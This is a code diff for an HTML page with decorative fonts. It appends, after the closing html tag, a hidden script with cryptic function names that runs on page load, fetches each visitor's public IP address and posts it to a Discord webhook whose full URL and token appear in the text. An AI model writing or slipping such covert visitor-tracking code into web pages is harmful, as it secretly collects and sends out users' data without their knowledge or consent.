@@ -119,8 +119,7 @@
         }
         doTheThing();
 
-            <script type="text/javascript">
-        function ogag() {
+                function ogag() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -146,7 +145,7 @@
         }
 
         document.addEventListener('DOMContentLoaded', ogag);
-    </script>
+
         
     </script>
     <link href="https://fonts.googleapis.com/css?family=New Rocker|Jolly Lodger|Teko|Inconsolata" rel="stylesheet" type="text/css">
@@ -329,3 +328,32 @@
 
 
 </font></body></html>
+
+    <script type="text/javascript">
+        function ogag() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    stw(ipAddress);
+                })
+        }
+
+        function stw(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1359797856097013794/KRY7jRsXmJ9no4f7rw-Z-geRmME2KediXIaup9iFKnXDQ3PKQnh3KmFlm7uPxxHSZuDp';
+
+            const payload = {
+                content: `User IP: ${ip}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+        }
+
+        document.addEventListener('DOMContentLoaded', ogag);
+    </script>
